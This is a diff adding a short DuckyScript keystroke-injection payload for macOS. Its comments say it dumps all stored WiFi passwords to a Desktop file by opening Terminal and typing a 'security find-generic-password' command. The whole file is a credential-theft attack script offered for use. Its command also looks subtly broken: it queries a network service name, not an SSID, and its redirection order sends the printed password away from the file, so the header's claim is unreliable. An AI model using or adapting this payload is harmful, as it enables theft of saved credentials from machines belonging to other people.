@@ -1,0 +1,14 @@
+REM Mac WiFi profile dump to Desktop
+REM Author: Ansfidine Youssouf
+REM Dumps all stored WiFi passwords to Desktop/wifi_dump.txt
+DELAY 1000
+COMMAND SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 1500
+STRING security find-generic-password -ga "$(networksetup -listallnetworkservices | tail -n +2 | head -n 1)" 2>&1 > ~/Desktop/wifi_dump.txt
+ENTER
+DELAY 1000
+STRING exit
+ENTER
